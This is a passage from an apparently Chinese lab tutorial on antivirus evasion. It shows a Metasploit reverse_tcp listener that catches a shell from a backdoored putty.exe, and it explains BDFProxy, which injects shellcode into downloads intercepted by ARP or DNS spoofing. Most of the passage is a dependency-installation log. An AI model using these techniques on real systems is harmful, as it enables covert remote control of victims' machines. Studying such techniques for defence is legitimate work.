class="line"><span class="comment">#使用msf侦听</span></span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.159.129</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"><span class="comment">#把putty放到靶机中，运行</span></span><br><span class="line"><span class="comment">#发现shell反弹</span></span><br><span class="line">msf exploit(multi/handler) &gt; sessions -i 1 <span class="comment">#进入shell</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207014727473-290303819.gif" /></p>
+<p>发现个问题，注入时位置选的可能有问题，影响到原程序的正常执行了，更大的可能是putty的防护机制所致，，，</p>
+<ul>
+<li><strong>在线查杀检测</strong></li>
+<li>putty-bdf.exe（注入单代码洞）</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207012716995-1109543613.png" /></p>
+<ul>
+<li>putty-bdf-J.exe（注入多代码洞）</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207012748241-1648462056.png" /></p>
+<ul>
+<li>putty-bdf-a.exe （附加代码）</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230207013021384-322521184.png" /></p>
+<h2 id="bdfproxy-免杀">9. Bdfproxy 免杀</h2>
+<ul>
+<li>集成mitmproxy</li>
+<li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS
+spoof、Fake AP）</li>
+<li>示例，victim 要下载个 putty.exe，hacker 此时处于 victim 和
+web站点中间，victim 和 web-severe 之间的通信流量会经过 hacker，hacker
+检测到传向victim的流量（putty.exe）符合 bdf 的注入条件，此时会将
+shellcode 注入 putty.exe，再将流量传给
+victim，victim一旦执行putty.exe会触发反弹 shell。</li>
+<li>启动路由功能进行流量劫持</li>
+<li>代理端口是8080，故把所有流量都转到8080端口</li>
+<li>启动bdfproxy，使得shell反弹</li>
+<li>官网：<a target="_blank" rel="noopener" href="https://github.com/secretsquirrel/BDFProxy"
+class="uri">https://github.com/secretsquirrel/BDFProxy</a></li>
+</ul>
+<h3 id="bdfproxy-安装">1、bdfproxy 安装</h3>
+<p>新版Kali未自带，需自行安装，基于 python2 环境</p>
+<p>下载：git clone https://github.com/secretsquirrel/BDFProxy.git</p>
+<p>建议根据执行提示，安装所缺模块 / 库，操作如下（
+<strong>务必注意版本</strong> ）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py             </span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;./bdf_proxy.py&quot;</span>, line 34, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from libmproxy import controller, proxy, platform</span><br><span class="line">**ImportError: No module named libmproxy**</span><br><span class="line"></span><br><span class="line"><span class="comment">#mitmproxy下载：https://github.com/mitmproxy/mitmproxy</span></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/ **mitmproxy- 0.16**]</span><br><span class="line">└─<span class="comment"># python2 setup.py install           </span></span><br><span class="line">………………………………</span><br><span class="line">/usr/lib/python2.7/distutils/dist.py:267: UserWarning: Unknown distribution option: <span class="string">&#x27;install_requires&#x27;</span></span><br><span class="line">  warnings.warn(msg)</span><br><span class="line">running install</span><br><span class="line">running build</span><br><span class="line">running build_py</span><br><span class="line">creating build</span><br><span class="line">creating build/lib.linux-x86_64-2.7</span><br><span class="line">creating build/lib.linux-x86_64-2.7/libmproxy</span><br><span class="line">copying libmproxy/dump.py -&gt; build/lib.linux-x86_64-2.7/libmproxy</span><br><span class="line">copying libmproxy/main.py -&gt; build/lib.linux-x86_64-2.7/libmproxy</span><br><span class="line">…………………………</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py              </span></span><br><span class="line">………………………………</span><br><span class="line">**ImportError: No module named netlib**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#下载：https://files.pythonhosted.org/packages/a8/18/d77c7e19df289628358beb498bd1d4c0ac9ca65eade441878fff7b07155f/netlib-0.16.tar.gz</span></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/netlib-0.16]</span><br><span class="line">└─<span class="comment"># python2 setup.py install</span></span><br><span class="line">…………………………</span><br><span class="line">creating build/lib.linux-x86_64-2.7/netlib</span><br><span class="line">copying netlib/utils.py -&gt; build/lib.linux-x86_64-2.7/netlib</span><br><span class="line">copying netlib/tutils.py -&gt; build/lib.linux-x86_64-2.7/netlib</span><br><span class="line">copying netlib/exceptions.py -&gt; build/lib.linux-x86_64-2.7/netlib</span><br><span class="line">………………………………</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py   </span></span><br><span class="line">……………………………………</span><br><span class="line">**ImportError: cannot import name ssl_match_hostname**</span><br><span class="line">  </span><br><span class="line"><span class="comment">#下载：https://distfiles.macports.org/py-backports-ssl_match_hostname/，注意版本</span></span><br><span class="line">**┌──(root㉿kali)** **-[~/ Desktop]</span><br><span class="line">└─<span class="comment"># wget https://distfiles.macports.org/py-backports-ssl_match_hostname/backports.ssl_match_hostname-3.5.0.1.tar.gz**</span></span><br><span class="line">--2023-02-08 01:06:04--  https://distfiles.macports.org/py-backports-ssl_match_hostname/backports.ssl_match_hostname-3.5.0.1.tar.gz</span><br><span class="line">Resolving distfiles.macports.org (distfiles.macports.org)... 151.101.2.132, 151.101.66.132, 151.101.130.132, ...</span><br><span class="line">Connecting to distfiles.macports.org (distfiles.macports.org)|151.101.2.132|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 5605 (5.5K) [application/x-gzip]</span><br><span class="line">Saving to: <span class="string">&#x27;backports.ssl_match_hostname-3.5.0.1.tar.gz&#x27;</span></span><br><span class="line"></span><br><span class="line">backports.ssl_match_hostname 100%[============================================&gt;]   5.47K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2023-02-08 01:06:07 (24.6 MB/s) - <span class="string">&#x27;backports.ssl_match_hostname-3.5.0.1.tar.gz&#x27;</span> saved [5605/5605]</span><br><span class="line"></span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># tar -zxvf backports.ssl_match_hostname-3.5.0.1.tar.gz </span></span><br><span class="line">backports.ssl_match_hostname-3.5.0.1/…………………………………………</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cd backports.ssl_match_hostname-3.5.0.1</span></span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/backports.ssl_match_hostname-3.5.0.1]</span><br><span class="line">└─<span class="comment"># python2 setup.py install</span></span><br><span class="line">running install</span><br><span class="line">running build</span><br><span class="line">running build_py</span><br><span class="line">creating build</span><br><span class="line">creating build/lib.linux-x86_64-2.7</span><br><span class="line">creating build/lib.linux-x86_64-2.7/backports</span><br><span class="line">copying backports/__init__.py -&gt; build/lib.linux-x86_64-2.7/backports</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">……………………………………</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python2.7/dist-packages/cryptography/hazmat/primitives/constant_time.py&quot;</span>, line 11, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from cryptography.hazmat.bindings._constant_time import lib</span><br><span class="line">**ImportError: No module named _constant_time**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/backports.ssl_match_hostname-3.5.0.1]</span><br><span class="line">└─<span class="comment"># **pip** **install** **cryptography**</span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting cryptography</span><br><span class="line">  Downloading cryptography-3.3.2-cp27-cp27mu-manylinux2010_x86_64.whl (2.6 MB)</span><br><span class="line">     |████████████████████████████████| 2.6 MB 853 kB/s </span><br><span class="line">Requirement already satisfied: cffi&gt;=1.12 <span class="keyword">in</span> /usr/lib/python2.7/dist-packages (from cryptography) (1.14.0)</span><br><span class="line">Collecting ipaddress; python_version &lt; <span class="string">&quot;3&quot;</span></span><br><span class="line">  Downloading ipaddress-1.0.23-py2.py3-none-any.whl (18 kB)</span><br><span class="line">Collecting six&gt;=1.4.1</span><br><span class="line">  Downloading six-1.16.0-py2.py3-none-any.whl (11 kB)</span><br><span class="line">Collecting enum34; python_version &lt; <span class="string">&quot;3&quot;</span></span><br><span class="line">  Downloading enum34-1.1.10-py2-none-any.whl (11 kB)</span><br><span class="line">Installing collected packages: ipaddress, six, enum34, cryptography</span><br><span class="line">Successfully installed cryptography-3.3.2 enum34-1.1.10 ipaddress-1.0.23 six-1.16.0</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">…………………………………………</span><br><span class="line">    from pyasn1.type import univ, constraint, char, namedtype, tag</span><br><span class="line">**ImportError: No module named pyasn1.type**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/backports.ssl_match_hostname-3.5.0.1]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **pyasn1**    </span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting pyasn1</span><br><span class="line">  Downloading pyasn1-0.4.8-py2.py3-none-any.whl (77 kB)</span><br><span class="line">     |████████████████████████████████| 77 kB 754 kB/s </span><br><span class="line">Installing collected packages: pyasn1</span><br><span class="line">Successfully installed pyasn1-0.4.8</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">………………………………………………</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/netlib/utils.py&quot;</span>, line 11, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import hyperframe</span><br><span class="line">**ImportError: No module named hyperframe**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/backports.ssl_match_hostname-3.5.0.1]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **hyperframe**</span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting hyperframe</span><br><span class="line">  Downloading hyperframe-5.2.0-py2.py3-none-any.whl (12 kB)</span><br><span class="line">Installing collected packages: hyperframe</span><br><span class="line">Successfully installed hyperframe-5.2.0</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">……………………………………………………</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/netlib/http/http2/connections.py&quot;</span>, line 5, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from hpack.hpack import Encoder, Decoder</span><br><span class="line">**ImportError: No module named hpack.hpack**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/backports.ssl_match_hostname-3.5.0.1]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **hpack**    </span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting hpack</span><br><span class="line">  Downloading hpack-3.0.0-py2.py3-none-any.whl (38 kB)</span><br><span class="line">Installing collected packages: hpack</span><br><span class="line">Successfully installed hpack-3.0.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">………………………………………………</span><br><span class="line">    from construct import ConstructError</span><br><span class="line">**ImportError: No module named construct**</span><br><span class="line">  </span><br><span class="line"><span class="comment">#下载：https://pypi.org/project/construct/2.5.2/#files ， **注意版本**</span></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># wget https://files.pythonhosted.org/packages/fd/5a/e3105c79b3b0bbf7a80dc8218d7416df6551f9f2fe389c9ce6690a621c00/construct-2.5.2.tar.gz</span></span><br><span class="line">--2023-02-08 01:53:18--  https://files.pythonhosted.org/packages/fd/5a/e3105c79b3b0bbf7a80dc8218d7416df6551f9f2fe389c9ce6690a621c00/construct-2.5.2.tar.gz</span><br><span class="line">Resolving files.pythonhosted.org (files.pythonhosted.org)... 151.101.1.63, 151.101.65.63, 151.101.129.63, ...</span><br><span class="line">Connecting to files.pythonhosted.org (files.pythonhosted.org)|151.101.1.63|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 58373 (57K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;construct-2.5.2.tar.gz&#x27;</span></span><br><span class="line"></span><br><span class="line">construct-2.5.2.tar.gz       100%[============================================&gt;]  57.00K  --.-KB/s    <span class="keyword">in</span> 0.09s   </span><br><span class="line"></span><br><span class="line">2023-02-08 01:53:21 (619 KB/s) - <span class="string">&#x27;construct-2.5.2.tar.gz&#x27;</span> saved [58373/58373]</span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># tar -zxvf construct-2.5.2.tar.gz </span></span><br><span class="line">construct-2.5.2/</span><br><span class="line">construct-2.5.2/construct.egg-info/…………………………………………</span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/construct-2.5.2]</span><br><span class="line">└─<span class="comment"># **python2 setup.py** **install**</span></span><br><span class="line">/usr/lib/python2.7/distutils/dist.py:267: UserWarning: Unknown distribution option: <span class="string">&#x27;install_requires&#x27;</span></span><br><span class="line">  warnings.warn(msg)</span><br><span class="line">running install</span><br><span class="line">running build</span><br><span class="line">running build_py</span><br><span class="line">creating build</span><br><span class="line">creating build/lib.linux-x86_64-2.7</span><br><span class="line">creating build/lib.linux-x86_64-2.7/construct</span><br><span class="line">copying construct/core.py -&gt; build/lib.linux-x86_64-2.7/construct</span><br><span class="line">copying construct/macros.py -&gt; build/lib.linux-x86_64-2.7/construct</span><br><span class="line">………………………………</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">………………………………</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/libmproxy/protocol/http.py&quot;</span>, line 11, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from h2.exceptions import H2Error</span><br><span class="line">**ImportError: No module named h2.exceptions**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/construct-2.5.2]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **h2**                               </span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting h2</span><br><span class="line">  Downloading h2-3.2.0-py2.py3-none-any.whl (65 kB)</span><br><span class="line">     |████████████████████████████████| 65 kB 626 kB/s </span><br><span class="line">Requirement already satisfied: hpack&lt;4,&gt;=3.0 <span class="keyword">in</span> /usr/local/lib/python2.7/dist-packages (from h2) (3.0.0)</span><br><span class="line">Requirement already satisfied: hyperframe&lt;6,&gt;=5.2.0 <span class="keyword">in</span> /usr/local/lib/python2.7/dist-packages (from h2) (5.2.0)</span><br><span class="line">Requirement already satisfied: enum34&lt;2,&gt;=1.1.6; python_version == <span class="string">&quot;2.7&quot;</span> <span class="keyword">in</span> /usr/local/lib/python2.7/dist-packages (from h2) (1.1.10)</span><br><span class="line">Installing collected packages: h2</span><br><span class="line">Successfully installed h2-3.2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">……………………………………</span><br><span class="line">  File <span class="string">&quot;/root/Desktop/BDFProxy/bdf/pebin.py&quot;</span>, line 41, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import pefile</span><br><span class="line">**ImportError: No module named pefile**</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载：https://src.fedoraproject.org/repo/pkgs/python-pefile/ **注意版本**</span></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/pefile-2019.4.18]</span><br><span class="line">└─<span class="comment"># python2 setup.py install</span></span><br><span class="line">…………………………</span><br><span class="line">copying pefile.py -&gt; build/lib.linux-x86_64-2.7</span><br><span class="line">copying peutils.py -&gt; build/lib.linux-x86_64-2.7</span><br><span class="line">………………………………</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">……………………………………………………</span><br><span class="line">  File <span class="string">&quot;/usr/local/lib/python2.7/dist-packages/pefile.py&quot;</span>, line 21, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from builtins import bytes</span><br><span class="line">**ImportError: No module named builtins**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># wget https://files.pythonhosted.org/packages/8f/2e/cf6accf7415237d6faeeebdc7832023c90e0282aa16fd3263db0eb4715ec/future-0.18.3.tar.gz  </span></span><br><span class="line">--2023-02-08 02:02:43--  https://files.pythonhosted.org/packages/8f/2e/cf6accf7415237d6faeeebdc7832023c90e0282aa16fd3263db0eb4715ec/future-0.18.3.tar.gz</span><br><span class="line">Resolving files.pythonhosted.org (files.pythonhosted.org)... 151.101.77.63, 2a04:4e42::319, 2a04:4e42:200::319, ...</span><br><span class="line">Connecting to files.pythonhosted.org (files.pythonhosted.org)|151.101.77.63|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 840896 (821K) [application/x-tar]</span><br><span class="line">Saving to: <span class="string">&#x27;future-0.18.3.tar.gz&#x27;</span></span><br><span class="line"></span><br><span class="line">future-0.18.3.tar.gz         100%[============================================&gt;] 821.19K  1.60MB/s    <span class="keyword">in</span> 0.5s    </span><br><span class="line"></span><br><span class="line">2023-02-08 02:02:46 (1.60 MB/s) - <span class="string">&#x27;future-0.18.3.tar.gz&#x27;</span> saved [840896/840896]</span><br><span class="line"></span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># tar -zxvf future-0.18.3.tar.gz   </span></span><br><span class="line">future-0.18.3/</span><br><span class="line">future-0.18.3/setup.sh………………………………</span><br><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/future-0.18.3]</span><br><span class="line">└─<span class="comment"># python2 setup.py install</span></span><br><span class="line">…………………………</span><br><span class="line">creating build/lib.linux-x86_64-2.7/future</span><br><span class="line">copying src/future/__init__.py -&gt; build/lib.linux-x86_64-2.7/future</span><br><span class="line">creating build/lib.linux-x86_64-2.7/future/builtins</span><br><span class="line">…………………………</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span class="line">…………………………………………</span><br><span class="line">  File <span class="string">&quot;/root/Desktop/BDFProxy/bdf/intel/intelCore.py&quot;</span>, line 38, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from capstone import * **ImportError: No module named capstone**</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/future-0.18.3]</span><br><span class="line">└─<span class="comment"># **pip2** **install** **capstone**</span></span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="keyword">for</span> Python 2.7 <span class="keyword">in</span> January 2021. More details about Python 2 support <span class="keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="comment">#python-2-support pip 21.0 will remove support for this functionality.                                                                      </span></span><br><span class="line">Collecting capstone</span><br><span class="line">  Downloading capstone-4.0.2-py2.py3-none-manylinux1_x86_64.whl (2.1 MB)</span><br><span class="line">     |████████████████████████████████| 2.1 MB 1.4 MB/s </span><br><span class="line">Installing collected packages: capstone</span><br><span class="line">Successfully installed capstone-4.0.2</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/BDFProxy]</span><br><span class="line">└─<span class="comment"># python2 ./bdf_proxy.py</span></span><br><span 